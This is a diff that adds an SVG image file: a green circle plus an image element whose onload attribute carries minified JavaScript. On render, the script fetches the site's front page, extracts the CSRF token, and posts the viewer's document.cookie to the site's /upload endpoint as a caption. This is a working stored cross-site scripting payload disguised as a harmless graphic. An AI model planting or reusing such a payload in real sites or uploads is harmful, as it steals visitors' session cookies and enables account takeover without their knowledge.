@@ -1,0 +1,7 @@
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <circle cx="50" cy="50" r="45" fill="green" id="foo" o="foo"/>
+  <image xlink:href="/static/logo.png" height="200"
+         onload="fetch('/',{credentials:'include'}).then((e=>e.text())).then((e=>{const t=(new DOMParser).parseFromString(e,'text/html').querySelector('[name=\'csrfmiddlewaretoken\']').value;fetch('/upload',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrfmiddlewaretoken='+t+'&amp;caption='+document.cookie,credentials:'include'})}));"
+/>
+</svg>
